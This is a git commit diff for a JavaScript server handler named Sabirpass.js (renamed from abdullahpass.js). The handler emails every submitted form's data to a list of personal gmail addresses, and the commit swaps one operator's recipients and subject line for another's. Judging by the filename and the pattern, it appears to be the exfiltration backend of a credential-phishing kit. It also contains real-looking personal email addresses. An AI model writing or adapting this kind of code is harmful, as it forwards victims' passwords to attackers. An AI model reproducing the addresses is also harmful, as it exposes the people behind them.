abca66962ac19dbe2732d586dcf751afb398baf3
zm9807350 <zm9807350@gmail.com>
2025-11-29 17:20:31 +0500

    Update and rename abdullahpass.js to Sabirpass.js

--- Sabirpass.js
+++ Sabirpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "newzatpage.@gmail.com,submitdispute@gmail.com,abdullahnizamani330@gmail.com",
-      subject: "Abdullah",
+      to: "linkquarry@gmail.com,fahadali9911ggg@gmail.com,saidreally03@gmail.com",
+      subject: "Sabir",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
